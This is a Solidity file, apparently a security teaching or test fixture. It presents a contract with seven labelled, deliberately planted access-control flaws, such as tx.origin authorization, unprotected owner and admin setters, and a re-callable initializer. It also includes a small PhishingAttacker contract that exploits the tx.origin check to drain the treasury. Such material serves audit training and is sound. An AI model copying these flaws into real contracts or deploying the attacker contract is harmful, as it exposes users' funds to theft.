// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title AccessControlFlawed
 * @notice Contract with multiple ACCESS CONTROL vulnerabilities
 * @dev Contains missing access modifiers and flawed authorization
 */
contract AccessControlFlawed {
    address public owner;
    address public pendingOwner;
    mapping(address => bool) public admins;
    mapping(address => uint256) public userBalances;

    uint256 public treasuryBalance;
    bool public paused;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
    event AdminAdded(address indexed admin);
    event FundsWithdrawn(address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
        admins[msg.sender] = true;
    }

    // VULNERABILITY 1: Missing access control - anyone can set owner!
    function setOwner(address newOwner) public {
        // Missing: require(msg.sender == owner, "Not owner");
        owner = newOwner;
        emit OwnershipTransferred(owner, newOwner);
    }

    // VULNERABILITY 2: tx.origin used for authorization
    function withdrawTreasury(uint256 amount) public {
        // VULNERABLE: tx.origin can be manipulated via phishing
        require(tx.origin == owner, "Not owner");
        require(amount <= treasuryBalance, "Insufficient treasury");

        treasuryBalance -= amount;
        payable(msg.sender).transfer(amount);
        emit FundsWithdrawn(msg.sender, amount);
    }

    // VULNERABILITY 3: Anyone can add themselves as admin
    function addAdmin(address admin) public {
        // Missing authorization check!
        admins[admin] = true;
        emit AdminAdded(admin);
    }

    // VULNERABILITY 4: Self-destruct with weak access control
    function destroy() public {
        // Only checks if caller is "an" admin, not THE owner
        require(admins[msg.sender], "Not admin");
        selfdestruct(payable(msg.sender));
    }

    // VULNERABILITY 5: Pause function without proper access control
    function togglePause() public {
        // Anyone can pause/unpause the contract!
        paused = !paused;
    }

    // VULNERABILITY 6: Unprotected initialize function
    bool private initialized;

    function initialize(address _owner) public {
        // Missing: require(!initialized) - can be re-initialized!
        owner = _owner;
        initialized = true;
    }

    // VULNERABILITY 7: Front-running vulnerable ownership transfer
    function transferOwnership(address newOwner) public {
        require(msg.sender == owner, "Not owner");
        // Direct transfer without pending mechanism is front-runnable
        owner = newOwner;
    }

    // Deposit function
    function deposit() public payable {
        require(!paused, "Contract paused");
        userBalances[msg.sender] += msg.value;
        treasuryBalance += msg.value / 10; // 10% fee
    }

    // User withdrawal
    function userWithdraw(uint256 amount) public {
        require(!paused, "Contract paused");
        require(userBalances[msg.sender] >= amount, "Insufficient balance");
        userBalances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {
        deposit();
    }
}

/**
 * @title PhishingAttacker
 * @notice Demonstrates tx.origin attack
 */
contract PhishingAttacker {
    AccessControlFlawed public target;
    address public attacker;

    constructor(address _target) {
        target = AccessControlFlawed(payable(_target));
        attacker = msg.sender;
    }

    // If owner calls this, tx.origin will be owner!
    function claimReward() external {
        // This calls withdrawTreasury with tx.origin = original caller (owner)
        target.withdrawTreasury(address(target).balance);
    }

    receive() external payable {}
}
